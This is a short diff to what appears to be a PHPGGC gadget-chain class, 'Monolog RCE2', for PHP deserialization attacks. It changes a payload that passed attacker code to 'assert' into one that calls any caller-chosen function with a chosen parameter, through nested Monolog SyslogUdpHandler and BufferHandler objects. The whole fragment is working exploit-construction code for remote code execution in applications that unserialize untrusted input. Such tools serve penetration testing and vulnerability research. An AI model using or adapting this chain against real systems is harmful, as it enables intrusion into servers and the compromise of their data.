@@ -10,12 +10,13 @@ class RCE2 extends \PHPGGC\GadgetChain\RCE
 
     public function generate(array $parameters)
     {
-        $code = $parameters['code'];
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
 
         return new \Monolog\Handler\SyslogUdpHandler(
             new \Monolog\Handler\BufferHandler(
-                ['current', 'assert'],
-                [$code, 'level' => null]
+                ['current', $function],
+                [$parameter, 'level' => null]
             )
         );
     }
